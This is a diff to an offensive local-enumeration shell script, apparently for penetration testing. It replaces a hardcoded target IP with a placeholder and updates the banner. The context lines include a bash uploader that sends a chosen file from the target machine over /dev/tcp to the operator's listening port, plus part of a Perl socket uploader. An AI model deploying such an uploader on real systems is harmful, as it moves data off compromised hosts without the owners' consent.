@@ -18,8 +18,7 @@
 OWN_IP="127.0.0.1"
 DOWLOADED_PORT=80
 UPLOADED_PORT=8100
-TARGET_IP="10.1.1.2"      # TODO: remove
-TARGET_UPLOAD_PORT=8090   # TODO: remove
+TARGET_NAME="ip/hostname"        # This is only idicative
 OUTPUT="local_enumeration.txt"
 
 DEBUG=0
@@ -79,7 +78,7 @@ PL_UPLOADER="use Socket;\nuse warnings;\nuse strict;\nmy \$remote = '$OWN_IP';\n
 SH_UPLOADER_NAME="uploader.sh"
 SH_UPLOADER="#!/bin/bash\nip=\"$OWN_IP\"\nport=$UPLOADED_PORT\nfile_to_upload=\$1\nif [ -z \"\$file_to_upload\" ] || [ ! -f \$file_to_upload ]\nthen\n    echo \"Usage: uploader.sh <local-file-to-upload>\"\n    exit 1\nfi\nexec 4<>/dev/tcp/\"\$ip\"/\"\$port\"\ncat \$file_to_upload >&4\nexec 4<&-\nexit 0"
 
-BANNER="#####################################################################\n#   LOCAL ENUMRATION ON THE MACHINE : $TARGET_IP\n#   This file is the result of the $NAME script\n#   Author: Antoine Brunet (Lovebug)\n#####################################################################\n"
+BANNER="#####################################################################\n#   LOCAL ENUMRATION ON THE MACHINE : $TARGET_NAME\n#   This file is the result of the $NAME script\n#   Author: Antoine Brunet (Lovebug)\n#####################################################################\n"
 
 splitter() {
     splitter_banner=$(cat <<-END
